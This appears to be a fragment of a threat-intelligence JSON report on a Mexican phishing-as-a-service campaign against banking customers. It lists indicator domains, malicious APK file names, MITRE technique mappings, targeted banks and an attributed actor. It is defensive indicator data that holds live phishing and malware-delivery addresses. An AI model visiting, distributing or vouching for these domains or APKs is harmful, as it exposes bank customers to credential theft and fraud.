+    "url": "http://folioaclaraciones.com/",
+    "domain": "folioaclaraciones.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861141,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "http://folioaclaraciones.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-09-14",
+   "dateLastSeen": "2026-09-14",
+   "domain": "callbalonx.info",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "e23832219a2ae6e2d494e9c8b44a0bd0a0ecad1e",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "callbalonx.info",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17936528612485,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "digitalaclaraciones.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "9df172259fc74c84396287ed1a40e7d7d9346df1",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://digitalaclaraciones.com/79386374",
+    "domain": "digitalaclaraciones.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861147,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://digitalaclaraciones.com/79386374"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "digitalaclaraciones.onl",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "eda4a550a7ea910b3e9da6425e2ecc8a33c8afda",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://digitalaclaraciones.onl/",
+    "domain": "digitalaclaraciones.onl",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861150,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://digitalaclaraciones.onl/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-09-14",
+   "dateLastSeen": "2026-09-14",
+   "domain": "panelbalonxfs.xyz",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "8b78d52f8c9e02b5ca0672d8e1324bcaf5728379",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "panelbalonxfs.xyz",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17936528611755,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "balonxvip.vip",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "9b2125489371c1f1be149a1de737b3a9c1e3303d",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "http://balonxvip.vip/",
+    "domain": "balonxvip.vip",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861156,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "http://balonxvip.vip/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "balonxvip.vip",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "e250269be58f285df5e8f0c28dba901f0c9128b9",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://balonxvip.vip/12482760",
+    "domain": "balonxvip.vip",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861159,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://balonxvip.vip/12482760"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "aclaracionesdigitalesmx.co",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "863b879cf3940d148252aea5f5c64526189ea2e7",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaracionesdigitalesmx.co/46881513",
+    "domain": "aclaracionesdigitalesmx.co",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861162,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaracionesdigitalesmx.co/46881513"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "aclaracionesdigitalesmx.co",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "f4c075527fd035834029119f87f82e410b8fb6ca",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaracionesdigitalesmx.co/18149761",
+    "domain": "aclaracionesdigitalesmx.co",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861164,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaracionesdigitalesmx.co/18149761"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "aclaracionesonline.pro",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "99a1ed5d5de7c5b442c0c52ae87c91120f12b8a8",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "http://aclaracionesonline.pro/",
+    "domain": "aclaracionesonline.pro",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861167,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "http://aclaracionesonline.pro/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "cargosdigitales.org",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "c6ae520951c7af20fc00f1a7c73fcb13c7ae667f",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "http://cargosdigitales.org/",
+    "domain": "cargosdigitales.org",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861169,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "http://cargosdigitales.org/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "aclaraciones-portal.info",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "1cf5d41d6fe6e5031318d2ac9188290465ac04d8",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaraciones-portal.info/",
+    "domain": "aclaraciones-portal.info",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861172,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaraciones-portal.info/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "plata.blindaje-mex.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "bffcff1ae39f468b026afcc49e670cf54fd09e4a",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://plata.blindaje-mex.com/08384214",
+    "domain": "plata.blindaje-mex.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861174,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://plata.blindaje-mex.com/08384214"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "plata.blindaje-mex.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "a34c84f2d40c57421c32eb4f6511004fdf06b774",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://plata.blindaje-mex.com/",
+    "domain": "plata.blindaje-mex.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861176,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://plata.blindaje-mex.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "www.blindaje-mex.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "49f9a213552fdd97506ce2d4456a0eeb2b408063",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://www.blindaje-mex.com/",
+    "domain": "www.blindaje-mex.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861178,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://www.blindaje-mex.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-02-24",
+   "dateLastSeen": "2026-04-22",
+   "domain": "balonxonline.pro",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "75b6b91d303bd87f925c051fb576bcf438cd75ae",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://balonxonline.pro/",
+    "domain": "balonxonline.pro",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17893849446729,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://balonxonline.pro/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-09-14",
+   "dateLastSeen": "2026-09-14",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "d4bac8215170fb30d5fbec7cb867d389d14a99a6",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "name": "https://js.hcaptcha.com/1/api.js",
+    "nameList": [
+     "https://js.hcaptcha.com/1/api.js"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "https://js.hcaptcha.com/1/api.js"
+   ],
+   "seqUpdate": 17893817861182,
+   "size": null,
+   "sources": [],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-09-14",
+   "dateLastSeen": "2026-09-14",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "38ca7b11d8da64ab2a5f6f1a35e76d9ae88bc43a",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "name": "Bankprotet2_1750982122281.apk",
+    "nameList": [
+     "Bankprotet2_1750982122281.apk"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "Bankprotet2_1750982122281.apk"
+   ],
+   "seqUpdate": 17893817861185,
+   "size": null,
+   "sources": [],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-09-14",
+   "dateLastSeen": "2026-09-14",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "bbf290ef0eb699ae3fc88b866bb402a1ddddd7c3",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "name": "BankProtect.apk",
+    "nameList": [
+     "BankProtect.apk"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "BankProtect.apk"
+   ],
+   "seqUpdate": 17893817861187,
+   "size": null,
+   "sources": [],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "file",
+   "url": null
+  }
+ ],
+ "indicatorsIds": [
+  "b24f131a7db57536decf8785f28ba3c4bc15649e",
+  "376e0b8a0a5844dd62b29d3f5278bc6a45925293",
+  "e0f200619b30163b584739d2fcdec77ef85a0732",
+  "3f9eb2146bf9004efbf4b5208f58f9746bc604ff",
+  "a3192975397fde0c1eb032d33c88120cb8dbb121",
+  "d405fa2ac4ff690ab1f1560439c38ea9e77c7569",
+  "83a3a8b213974c5399fdd8543fbe80236c0c42f1",
+  "f3e93a8f54e03cece1672cddfa87486a80a173fd",
+  "a1649af5e4b91bf99d5b3277265841ea71079a3b",
+  "8017502f8db12d45bcd3548e34313e291d205f4a",
+  "0218702828adb63dc6e15965f61ccaa961813ccd",
+  "4886ee17a8caebfaf792b0ff7b1f270a7ed943d5",
+  "621fe27b4fd2a84a24536194cdc06d7095c50a6d",
+  "7b0d9fe08a8cff3499569bac0cde0939d1fd5f14",
+  "2cb9ad505b18d3fb55052eca268fc5e1f2fafa58",
+  "6a45b7773ba0e9b7273448be80e3355d97ea6b78",
+  "54128e62e868757e02ee8ff6b8bad365281c8058",
+  "81181de0389d4b62de055c180fe2ccc965131ab2",
+  "cc74d7da5d8a4ee0f3ee59dc12d7da01e8791b89",
+  "8651b05c4df339a31d953b81fd3e3a1f00712dd8",
+  "432d804cd7f857a06265e029bc692e43539115b6",
+  "2eddd9eb17255f69795e69aa41b7ac7e9d2cc8f5",
+  "e23832219a2ae6e2d494e9c8b44a0bd0a0ecad1e",
+  "9df172259fc74c84396287ed1a40e7d7d9346df1",
+  "eda4a550a7ea910b3e9da6425e2ecc8a33c8afda",
+  "8b78d52f8c9e02b5ca0672d8e1324bcaf5728379",
+  "9b2125489371c1f1be149a1de737b3a9c1e3303d",
+  "e250269be58f285df5e8f0c28dba901f0c9128b9",
+  "863b879cf3940d148252aea5f5c64526189ea2e7",
+  "f4c075527fd035834029119f87f82e410b8fb6ca",
+  "99a1ed5d5de7c5b442c0c52ae87c91120f12b8a8",
+  "c6ae520951c7af20fc00f1a7c73fcb13c7ae667f",
+  "1cf5d41d6fe6e5031318d2ac9188290465ac04d8",
+  "bffcff1ae39f468b026afcc49e670cf54fd09e4a",
+  "a34c84f2d40c57421c32eb4f6511004fdf06b774",
+  "49f9a213552fdd97506ce2d4456a0eeb2b408063",
+  "75b6b91d303bd87f925c051fb576bcf438cd75ae",
+  "d4bac8215170fb30d5fbec7cb867d389d14a99a6",
+  "38ca7b11d8da64ab2a5f6f1a35e76d9ae88bc43a",
+  "bbf290ef0eb699ae3fc88b866bb402a1ddddd7c3"
+ ],
+ "isAutogen": false,
+ "isPublished": true,
+ "isTailored": false,
+ "labels": [],
+ "langs": [
+  "en"
+ ],
+ "malwareList": [],
+ "mitreMatrix": [
+  {
+   "attackName": "[Obtain Capabilities->Malware]",
+   "attackPatternId": "attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970",
+   "attackTactic": "resource-development",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1588.001",
+   "params": null
+  },
+  {
+   "attackName": "[Stage Capabilities->Link Target]",
+   "attackPatternId": "attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701",
+   "attackTactic": "resource-development",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1608.005",
+   "params": null
+  },
+  {
+   "attackName": "[Phishing->Spearphishing Link]",
+   "attackPatternId": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
+   "attackTactic": "initial-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1566.002",
+   "params": null
+  },
+  {
+   "attackName": "[Input Capture->Web Portal Capture]",
+   "attackPatternId": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
+   "attackTactic": "collection",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1056.003",
+   "params": null
+  },
+  {
+   "attackName": "[Input Capture->Web Portal Capture]",
+   "attackPatternId": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
+   "attackTactic": "credential-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1056.003",
+   "params": null
+  },
+  {
+   "attackName": "Multi-Factor Authentication Interception",
+   "attackPatternId": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
+   "attackTactic": "credential-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1111",
+   "params": null
+  },
+  {
+   "attackName": "[Application Layer Protocol->Web Protocols]",
+   "attackPatternId": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
+   "attackTactic": "command-and-control",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1071.001",
+   "params": null
+  },
+  {
+   "attackName": "Exfiltration Over C2 Channel",
+   "attackPatternId": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
+   "attackTactic": "exfiltration",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1041",
+   "params": null
+  }
+ ],
+ "oldId": null,
+ "regions": [
+  "america:central_america"
+ ],
+ "relatedThreatActors": [],
+ "reportNumber": "CP-3004-0118",
+ "sectors": [
+  "financial-services:banking",
+  "financial-services"
+ ],
+ "seqPublish": null,
+ "seqUpdate": 17893817862970,
+ "shortDescription": null,
+ "shortTitle": null,
+ "sourceList": [],
+ "sources": [],
+ "targetDomain": [],
+ "targetedCompany": [
+  "PlataCard",
+  "Grupo Financiero Banorte SAB de CV",
+  "BanCoppel",
+  "Falabella",
+  "Banco Azteca",
+  "Banco del Bienestar",
+  "American Express",
+  "Mifel",
+  "Afirme",
+  "Banjercito",
+  "Liverpool",
+  "Scotiabank",
+  "HSBC Holdings plc"
+ ],
+ "targetedPartnersAndClients": [],
+ "techSeqUpdate": null,
+ "threatActor": {
+  "country": "MX",
+  "id": "2530a2b46223154e3bc70a245138aa3c4eb75446",
+  "isAPT": false,
+  "name": "BalonxSistema"
+ },
+ "title": "Phishing Campaign Analysis — Aclaraciones Bancarias (PhaaS Mexico)",
+ "toolList": [],
+ "type": "threat",
+ "unreliableIndicators": [],
+ "unreliableIndicatorsRelations": [],
+ "updatedAt": "2026-09-14T13:29:46+03:00"
+}
